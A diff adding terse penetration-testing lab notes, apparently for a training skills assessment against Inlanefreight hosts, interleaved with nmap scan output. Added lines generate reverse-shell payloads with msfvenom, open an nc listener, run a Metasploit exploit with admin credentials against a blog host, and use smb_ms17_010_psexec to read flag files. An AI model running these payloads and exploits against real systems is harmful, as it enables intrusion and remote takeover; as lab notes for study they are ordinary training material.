@@ -679,9 +679,13 @@ PORT     STATE SERVICE       VERSION
 |_http-open-proxy: Proxy might be redirecting requests
 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 $xfreerdp /v:<ip> /u:<user> /p:<pass>
-$msfvenom -p <payload> LHOST=<LHOST> LPORT=<LPORT> -f <FORMAT> -o <outfile>
+############$msfvenom -p <payload> LHOST=<LHOST> LPORT=<LPORT> -f <FORMAT> -o <outfile>
 start handle> $msfconsole use exploit/mutil/handler 
->set PAYLOAD windows/meterpreter/reverse-tcp  >set LHOST <ip>   >set LPORT 4444 run-j 
+###############>set PAYLOAD windows/meterpreter/reverse-tcp  >set LHOST <ip>   >set LPORT 4444 run-j 
+$nc -nvlp 9001 (onpawn)
+ip a | grep "172.16.1.*" (to see the jump host)
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<pwnip> LPORT=9001 -f war -o tomcat.war
+$dir C:\shares\
 
 
 
@@ -722,6 +726,16 @@ PORT   STATE SERVICE VERSION
 |_http-title: Inlanefreight Gabber
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+$nmap -A host 2  (ssh service exposing OS falvour of linux tobe ubuntu)
+
+$searchsploit 50064.rb  ->php
+$grep "DefaultOptions" 50064.rb
+$broswer for blog.inlanefreight.local
+$msfconsole -q   > use 50064.rb
+set Options > set VHOST blog.inalanefreight.local
+set RHOST 172.16.1.12
+set USERNAME admin
+set PASSWORD admin123!@#  >exploit > $shell > cat /customscripts/flag.txt
 
 Host 3 result
 Starting Nmap 7.92 ( https://nmap.org ) at 2025-10-02 11:31 EDT
@@ -762,3 +776,9 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 27.06 seconds
+
+$msfconsole -q > use exploit/windows/smb/smb_ms17_010_psexec
+$ set LHOST <ipjumphost pwn>
+$ set RHOSTS 172.16.1.13  > exploit > cat C:/Users/Administrator/Desktop/Skill-flag.txt
+shell
+type C:\Users\Administrator\Desktop\Skills-flag.txt
